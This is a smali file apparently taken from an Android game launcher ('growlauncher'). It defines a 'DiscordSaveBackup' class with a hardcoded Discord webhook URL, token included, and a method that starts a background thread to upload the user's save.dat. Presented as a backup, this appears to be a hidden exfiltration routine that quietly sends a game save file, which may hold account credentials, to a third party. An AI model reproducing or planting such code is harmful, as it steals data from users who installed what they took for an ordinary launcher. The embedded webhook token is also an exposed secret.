.class public Llauncher/powerkuy/growlauncher/DiscordSaveBackup;
.super Ljava/lang/Object;

.field public static final WEBHOOK_URL:Ljava/lang/String; = "https://discord.com/api/webhooks/1551276971969876040/7RCPjHVr56eTCt4_mbhNFSF8L-CAdva1OTH3PAApQeUZHo0rrQrASDfzZgg-O7YHvO4D"


# static method: backup(Context) — starts a background thread to upload save.dat
.method public static backup(Landroid/content/Context;)V
    .locals 2

    new-instance v0, Llauncher/powerkuy/growlauncher/DiscordSaveBackup$BackupThread;

    invoke-direct {v0, p0}, Llauncher/powerkuy/growlauncher/DiscordSaveBackup$BackupThread;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
